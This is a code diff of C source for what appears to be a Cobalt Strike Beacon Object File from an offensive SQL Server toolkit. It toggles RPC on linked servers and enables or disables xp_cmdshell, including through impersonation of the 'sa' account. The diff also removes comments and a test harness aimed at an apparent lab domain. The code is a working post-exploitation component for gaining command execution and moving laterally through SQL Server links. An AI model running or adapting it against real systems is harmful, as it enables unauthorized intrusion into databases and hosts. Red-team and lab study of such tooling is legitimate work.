@@ -3,9 +3,7 @@
 #include "sql.c"
 #include "sql_modules.c"
 
-// rpc requires different functions/values than the other modules
-void ToggleRpc(char *server, char *database, char *link, char *impersonate,
-               char *value, char *user, char *password) {
+void ToggleRpc(char *server, char *database, char *link, char *impersonate, char *value, char *user, char *password) {
   SQLHENV env = NULL;
   SQLHSTMT stmt = NULL;
   SQLHDBC dbc = NULL;
@@ -18,18 +16,12 @@ void ToggleRpc(char *server, char *database, char *link, char *impersonate,
 
   internal_printf("[*] Toggling RPC on %s...\n\n", link);
 
-  //
-  // allocate statement handle
-  //
   ODBC32$SQLAllocHandle(SQL_HANDLE_STMT, dbc, &stmt);
 
   if (!ToggleModule(stmt, "rpc", value, link, impersonate)) {
     goto END;
   }
 
-  //
-  // Close the cursor
-  //
   ODBC32$SQLCloseCursor(stmt);
 
   if (!CheckRpcOnLink(stmt, link, impersonate)) {
@@ -38,19 +30,13 @@ void ToggleRpc(char *server, char *database, char *link, char *impersonate,
 
   PrintQueryResults(stmt, TRUE);
 
-  //
-  // close the cursor
-  //
   ODBC32$SQLCloseCursor(stmt);
 
 END:
   DisconnectSqlServer(env, dbc, stmt);
 }
 
-// non-rpc modules are treated the same
-void ToggleGenericModule(char *server, char *database, char *link,
-                         char *impersonate, char *module, char *value,
-                         char *user, char *password) {
+void ToggleGenericModule(char *server, char *database, char *link, char *impersonate, char *module, char *value, char *user, char *password) {
   SQLHENV env = NULL;
   SQLHSTMT stmt = NULL;
   SQLHDBC dbc = NULL;
@@ -61,9 +47,6 @@ void ToggleGenericModule(char *server, char *database, char *link,
     goto END;
   }
 
-  //
-  // allocate statement handle
-  //
   ODBC32$SQLAllocHandle(SQL_HANDLE_STMT, dbc, &stmt);
 
   if (link == NULL) {
@@ -76,14 +59,7 @@ void ToggleGenericModule(char *server, char *database, char *link,
     goto END;
   }
 
-  //
-  // Close the cursor
-  //
   ODBC32$SQLCloseCursor(stmt);
-
-  //
-  // Check new status and print
-  //
 
   CheckModuleStatus(stmt, module, link, impersonate);
 
@@ -94,7 +70,6 @@ END:
   DisconnectSqlServer(env, dbc, stmt);
 }
 
-#ifdef BOF
 VOID go(IN PCHAR Buffer, IN ULONG Length) {
   char *server;
   char *database;
@@ -105,9 +80,6 @@ VOID go(IN PCHAR Buffer, IN ULONG Length) {
   char *user;
   char *password;
 
-  //
-  // parse beacon args
-  //
   datap parser;
   BeaconDataParse(&parser, Buffer, Length);
 
@@ -131,7 +103,6 @@ VOID go(IN PCHAR Buffer, IN ULONG Length) {
     return;
   }
 
-  // we're toggling RPC
   if (MSVCRT$strcmp(module, "rpc") == 0) {
     if (link == NULL) {
       internal_printf("[!] A link must be specified\n");
@@ -140,59 +111,13 @@ VOID go(IN PCHAR Buffer, IN ULONG Length) {
     }
     ToggleRpc(server, database, link, impersonate, value, user, password);
   }
-  // we're toggling one of the other modules that we treat the same
   else {
     if (UsingLinkAndImpersonate(link, impersonate)) {
       return;
     }
 
-    ToggleGenericModule(server, database, link, impersonate, module, value,
-                        user, password);
+    ToggleGenericModule(server, database, link, impersonate, module, value, user, password);
   }
 
   printoutput(TRUE);
 };
-
-#else
-
-int main() {
-  internal_printf("============ LINK RPC DISABLE TEST ============\n\n");
-  ToggleRpc("castelblack.north.sevenkingdoms.local", "master", "BRAAVOS", NULL,
-            "FALSE", NULL, NULL);
-
-  internal_printf("\n\n============ LINK RPC ENABLE TEST ============\n\n");
-  ToggleRpc("castelblack.north.sevenkingdoms.local", "master", "BRAAVOS", NULL,
-            "TRUE", NULL, NULL);
-
-  internal_printf(
-      "\n\n============ BASE XP_CMDSHELL DISABLE TEST ============\n\n");
-  ToggleGenericModule("castelblack.north.sevenkingdoms.local", "master", NULL,
-                      NULL, "xp_cmdshell", "0", NULL, NULL);
-
-  internal_printf(
-      "\n\n============ BASE XP_CMDSHELL ENABLE TEST ============\n\n");
-  ToggleGenericModule("castelblack.north.sevenkingdoms.local", "master", NULL,
-                      NULL, "xp_cmdshell", "1", NULL, NULL);
-
-  internal_printf(
-      "\n\n============ IMPERSONATE XP_CMDSHELL DISABLE TEST ============\n\n");
-  ToggleGenericModule("castelblack.north.sevenkingdoms.local", "master", NULL,
-                      "sa", "xp_cmdshell", "0", NULL, NULL);
-
-  internal_printf(
-      "\n\n============ IMPERSONATE XP_CMDSHELL ENABLE TEST ============\n\n");
-  ToggleGenericModule("castelblack.north.sevenkingdoms.local", "master", NULL,
-                      "sa", "xp_cmdshell", "1", NULL, NULL);
-
-  internal_printf(
-      "\n\n============ LINK XP_CMDSHELL DISABLE TEST ============\n\n");
-  ToggleGenericModule("castelblack.north.sevenkingdoms.local", "master",
-                      "BRAAVOS", NULL, "xp_cmdshell", "0", NULL, NULL);
-
-  internal_printf(
-      "\n\n============ LINK XP_CMDSHELL ENABLE TEST ============\n\n");
-  ToggleGenericModule("castelblack.north.sevenkingdoms.local", "master",
-                      "BRAAVOS", NULL, "xp_cmdshell", "1", NULL, NULL);
-}
-
-#endif
